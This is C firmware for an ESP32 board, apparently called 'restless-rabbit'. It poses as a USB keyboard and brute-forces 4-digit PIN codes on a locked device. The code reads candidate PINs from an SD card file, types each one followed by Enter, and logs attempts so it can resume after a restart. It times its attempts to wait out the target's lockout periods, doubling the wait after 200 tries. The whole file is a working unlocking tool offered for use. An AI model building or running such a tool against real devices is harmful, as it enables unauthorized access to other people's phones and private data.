// standard
#include <stdlib.h>
#include <sys/unistd.h>
#include <sys/stat.h>
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

// USB HID
#include "tinyusb.h"
#include "class/hid/hid_device.h"
#include "driver/gpio.h"

// SD card
#include "esp_vfs_fat.h"
#include "sdmmc_cmd.h"
#include "driver/sdmmc_host.h"

// application constants
#define LED_GPIO               2
#define MOUNT_POINT            "/sdcard"
#define PIN_SD_MMC_CMD         38
#define PIN_SD_MMC_CLK         39
#define PIN_SD_MMC_D0          40
#define LOG_TAG                "restless-rabbit"
#define TUSB_DESC_TOTAL_LEN    (TUD_CONFIG_DESC_LEN + CFG_TUD_HID * TUD_HID_DESC_LEN)

// name of the passcode attempts log file
const char *passcode_log_filename = MOUNT_POINT"/pin.log";

// SD card object
sdmmc_card_t *card;

/**
 * @brief USB HID report descriptor
 *
 * In this example we implement Keyboard + Mouse HID device,
 * so we must define both report descriptors
 */
const uint8_t hid_report_descriptor[] = {
    TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(HID_ITF_PROTOCOL_KEYBOARD)),
    TUD_HID_REPORT_DESC_MOUSE(HID_REPORT_ID(HID_ITF_PROTOCOL_MOUSE))
};

/**
 * @brief USB HID string descriptor
 */
const char* hid_string_descriptor[5] = {
    // array of pointer to string descriptors
    (char[]){0x09, 0x04},     // 0: is supported language is English (0x0409)
    "TinyUSB",                // 1: Manufacturer
    "TinyUSB Device",         // 2: Product
    "123456",                 // 3: Serials, should use chip ID
    "Keyboard emulator",      // 4: HID
};

/**
 * @brief USB HID configuration descriptor
 *
 * This is a simple configuration descriptor that defines 1 configuration and 1 HID interface
 */
static const uint8_t hid_configuration_descriptor[] = {
    // Configuration number, interface count, string index, total length, attribute, power in mA
    TUD_CONFIG_DESCRIPTOR(1, 1, 0, TUSB_DESC_TOTAL_LEN, TUSB_DESC_CONFIG_ATT_REMOTE_WAKEUP, 100),

    // Interface number, string index, boot protocol, report descriptor len, EP In address, size & polling interval
    TUD_HID_DESCRIPTOR(0, 4, false, sizeof(hid_report_descriptor), 0x81, 16, 10),
};

// Invoked when received GET HID REPORT DESCRIPTOR request
// Application return pointer to descriptor, whose contents must exist long enough for transfer to complete
uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance)
{
    // We use only one interface and one HID report descriptor, so we can ignore parameter 'instance'
    return hid_report_descriptor;
}

// Invoked when received GET_REPORT control request
// Application must fill buffer report's content and return its length.
// Return zero will cause the stack to STALL request
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t* buffer, uint16_t reqlen)
{
    (void) instance;
    (void) report_id;
    (void) report_type;
    (void) buffer;
    (void) reqlen;

    return 0;
}

// Invoked when received SET_REPORT control request or
// received data on OUT endpoint ( Report ID = 0, Type = 0 )
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize)
{
}

// Write line to file
static esp_err_t write_line(const char *path, char *data)
{
    FILE *f = fopen(path, "a");
    if (f == NULL)
    {
        ESP_LOGE(LOG_TAG, "Failed to open file for appending");
        return ESP_FAIL;
    }
    fprintf(f, data);
    fclose(f);

    return ESP_OK;
}

// Read last line of file
static esp_err_t read_last_passcode(int *passcode)
{
    FILE *f = fopen(passcode_log_filename, "r");
    if (f == NULL)
    {
        ESP_LOGE(LOG_TAG, "Failed to open file for reading");
        return ESP_FAIL;
    }
    
    while (!feof(f))
    {
        fscanf(f, "%d", passcode);
    }

    fclose(f);

    return ESP_OK;
}

// enter passcode digits by using USB HID interface to emulate keyboard presses
static void send_passcode(int passcode)
{
    // get the 4 digits of the numeric passcode
    const int passcode_len = 4;
    uint8_t digits[passcode_len] = {};
    char pincode_str[20];
    int i = 0;
    while (passcode > 0) {
        digits[i] = passcode % 10;
        passcode /= 10;
        i++;
    }

    // get current time
    time_t now;
    char timestr[64];
    struct tm timeinfo;
    time(&now);
    localtime_r(&now, &timeinfo);
    strftime(timestr, sizeof(timestr), "%X", &timeinfo);
    
    // write current pin to log file
    sprintf(pincode_str, "%d%d%d%d\n", digits[3], digits[2], digits[1], digits[0]);
    write_line(passcode_log_filename, pincode_str);

    ESP_LOGI(LOG_TAG, "%s Trying pin %d%d%d%d", timestr, digits[3], digits[2], digits[1], digits[0]);

    // enter the passcode
    uint8_t keycode[6] = {};
    for (int i = passcode_len - 1; i >= 0; i--)
    {
        // HID_KEY_1 = 30
        // HID_KEY_2 = 31
        // HID_KEY_0 = 39

        if (digits[i] == 0)
        {
            keycode[0] = HID_KEY_0;
        }
        else
        {
            keycode[0] = HID_KEY_Z + digits[i];
        }

        // press key
        tud_hid_keyboard_report(HID_ITF_PROTOCOL_KEYBOARD, 0, keycode);
        vTaskDelay(pdMS_TO_TICKS(50));

        // release key
        tud_hid_keyboard_report(HID_ITF_PROTOCOL_KEYBOARD, 0, NULL);
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    // press/release enter key to submit passcode
    keycode[0] = HID_KEY_ENTER;
    tud_hid_keyboard_report(HID_ITF_PROTOCOL_KEYBOARD, 0, keycode);
    vTaskDelay(pdMS_TO_TICKS(50));
    tud_hid_keyboard_report(HID_ITF_PROTOCOL_KEYBOARD, 0, NULL);
    vTaskDelay(pdMS_TO_TICKS(50));
}

// main application entry point
void app_main(void)
{
    // initialize GPIO that will trigger HID reports
    const gpio_config_t boot_button_config = {
        .pin_bit_mask = BIT64(GPIO_NUM_0),
        .mode = GPIO_MODE_INPUT,
        .intr_type = GPIO_INTR_DISABLE,
        .pull_up_en = true,
        .pull_down_en = false,
    };
    ESP_ERROR_CHECK(gpio_config(&boot_button_config));

    ESP_LOGI(LOG_TAG, "USB initialization");
    const tinyusb_config_t tusb_cfg = {
        .device_descriptor = NULL,
        .string_descriptor = hid_string_descriptor,
        .string_descriptor_count = sizeof(hid_string_descriptor) / sizeof(hid_string_descriptor[0]),
        .external_phy = false,
#if (TUD_OPT_HIGH_SPEED)
        .fs_configuration_descriptor = hid_configuration_descriptor, // HID configuration descriptor for full-speed and high-speed are the same
        .hs_configuration_descriptor = hid_configuration_descriptor,
        .qualifier_descriptor = NULL,
#else
        .configuration_descriptor = hid_configuration_descriptor,
#endif // TUD_OPT_HIGH_SPEED
    };

    ESP_ERROR_CHECK(tinyusb_driver_install(&tusb_cfg));
    ESP_LOGI(LOG_TAG, "USB initialization DONE");

    // SD card setup
    esp_err_t ret;
    esp_vfs_fat_sdmmc_mount_config_t mount_config = {
        .format_if_mount_failed = true,
        .max_files = 5,
        .allocation_unit_size = 16 * 1024
    };
    const char mount_point[] = MOUNT_POINT;
    ESP_LOGI(LOG_TAG, "Initializing SD card");

    // By default, SD card frequency is initialized to SDMMC_FREQ_DEFAULT (20MHz)
    // For setting a specific frequency, use host.max_freq_khz (range 400kHz - 40MHz for SDMMC)
    // Example: for fixed frequency of 10MHz, use host.max_freq_khz = 10000;
    sdmmc_host_t host = SDMMC_HOST_DEFAULT();

    // For SoCs where the SD power can be supplied both via an internal or external (e.g. on-board LDO) power supply.
    // When using specific IO pins (which can be used for ultra high-speed SDMMC) to connect to the SD card
    // and the internal LDO power supply, we need to initialize the power supply first.
#if CONFIG_EXAMPLE_SD_PWR_CTRL_LDO_INTERNAL_IO
    sd_pwr_ctrl_ldo_config_t ldo_config = {
        .ldo_chan_id = CONFIG_EXAMPLE_SD_PWR_CTRL_LDO_IO_ID,
    };
    sd_pwr_ctrl_handle_t pwr_ctrl_handle = NULL;

    ret = sd_pwr_ctrl_new_on_chip_ldo(&ldo_config, &pwr_ctrl_handle);
    if (ret != ESP_OK) {
        ESP_LOGE(LOG_TAG, "Failed to create a new on-chip LDO power control driver");
        return;
    }
    host.pwr_ctrl_handle = pwr_ctrl_handle;
#endif

    // This initializes the slot without card detect (CD) and write protect (WP) signals.
    // Modify slot_config.gpio_cd and slot_config.gpio_wp if your board has these signals.
    sdmmc_slot_config_t slot_config = SDMMC_SLOT_CONFIG_DEFAULT();

    // Set bus width to use:
    slot_config.width = 1;

    // On chips where the GPIOs used for SD card can be configured, set them in
    // the slot_config structure:
#ifdef CONFIG_SOC_SDMMC_USE_GPIO_MATRIX
    slot_config.clk = PIN_SD_MMC_CLK;
    slot_config.cmd = PIN_SD_MMC_CMD;
    slot_config.d0 = PIN_SD_MMC_D0;
#endif  // CONFIG_SOC_SDMMC_USE_GPIO_MATRIX

    // Enable internal pullups on enabled pins. The internal pullups
    // are insufficient however, please make sure 10k external pullups are
    // connected on the bus. This is for debug / example purpose only.
    slot_config.flags |= SDMMC_SLOT_FLAG_INTERNAL_PULLUP;

    ESP_LOGI(LOG_TAG, "Mounting filesystem");
    ret = esp_vfs_fat_sdmmc_mount(mount_point, &host, &slot_config, &mount_config, &card);

    if (ret != ESP_OK) {
        if (ret == ESP_FAIL) {
            ESP_LOGE(LOG_TAG, "Failed to mount filesystem");
        } else {
            ESP_LOGE(LOG_TAG, "Failed to initialize the card (%s). "
                     "Make sure SD card lines have pull-up resistors in place.", esp_err_to_name(ret));
        }
        return;
    }
    ESP_LOGI(LOG_TAG, "Filesystem mounted");
    sdmmc_card_print_info(stdout, card);

    // main application settings
    const int attempt_limit_timeout_doubled = 200;  // after this many attempts, timeout is doubled
    const int attempt_limit_no_timeouts = 1;        // you get this many attempts before hitting the timeout
    const int leeway_secs = 5;                      // allow for a few extra seconds to align times
    int timeout_seconds = 960 + leeway_secs;        // number of seconds to wait after timeout hit

    // configure status LED
    gpio_reset_pin(LED_GPIO);
    gpio_set_direction(LED_GPIO, GPIO_MODE_OUTPUT);

    // start with status LED illuminated to show it is configuring, when configured it will turn off
    gpio_set_level(LED_GPIO, 1);

    // continue where we left off by reading the last tested passcode from the log file
    int starting_passcode = 0;
    read_last_passcode(&starting_passcode);

    // open passcode dictionary file
    FILE *pinlist = fopen(MOUNT_POINT"/PIN4.TXT", "r");
    if (pinlist == NULL)
    {
        ESP_LOGE(LOG_TAG, "Failed to open pinlist file for reading");
        return;
    }

    // skip through the file to find the starting passcode (from where we left off)
    int passcode = 0;
    int num_passcodes_tried = 0;
    do
    {
        fscanf(pinlist, "%d", &passcode);
        num_passcodes_tried++;
    } while (passcode != starting_passcode);
    ESP_LOGI(LOG_TAG, "Previous attempts: %d", num_passcodes_tried);

    // get cracking (observing timeouts etc)...
    int attempts = 0;
    int consecutive_attempts = 0;
    while (!feof(pinlist))
    {
        if (tud_mounted())
        {
            // try passcode and read next passcode from file
            send_passcode(passcode);
            fscanf(pinlist, "%d", &passcode);
            attempts++;
            consecutive_attempts++;

            if (attempts == attempt_limit_timeout_doubled)
            {
                attempts = 0;
                timeout_seconds *= 2;
            }
            else if (consecutive_attempts < attempt_limit_no_timeouts)
            {
                // no timeout required, so just go ahead and try next pincode (after a second grace period)
                vTaskDelay(pdMS_TO_TICKS(1000));
                continue;
            }
            vTaskDelay(pdMS_TO_TICKS(timeout_seconds * 1000));
            consecutive_attempts = 0;
        }

        // powered, but HID not initialised yet, give it some more time
        gpio_set_level(LED_GPIO, 1);
        vTaskDelay(pdMS_TO_TICKS(100));
        gpio_set_level(LED_GPIO, 0);
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    // tried every passcode in the dictionary file, flash LED to indicate done
    while(1)
    {
        for (int i = 0; i < 3; i++)
        {
            gpio_set_level(LED_GPIO, 1);
            vTaskDelay(pdMS_TO_TICKS(100));
            gpio_set_level(LED_GPIO, 0);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        vTaskDelay(pdMS_TO_TICKS(2000));
    }

    fclose(pinlist);
}
